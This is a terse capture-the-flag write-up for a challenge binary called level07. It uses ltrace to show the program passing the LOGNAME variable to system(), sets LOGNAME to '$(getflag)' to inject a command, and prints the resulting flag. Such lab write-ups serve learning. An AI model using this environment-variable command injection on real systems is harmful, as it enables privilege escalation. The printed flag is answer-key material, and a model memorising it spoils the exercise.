1. `ltrace ./level07` => `getenv("LOGNAME")` => `system("/bin/echo level07 ")`
2. `export LOGNAME='$(getflag)'`

> Flag: fiumuikeil55xe9cu4dood66h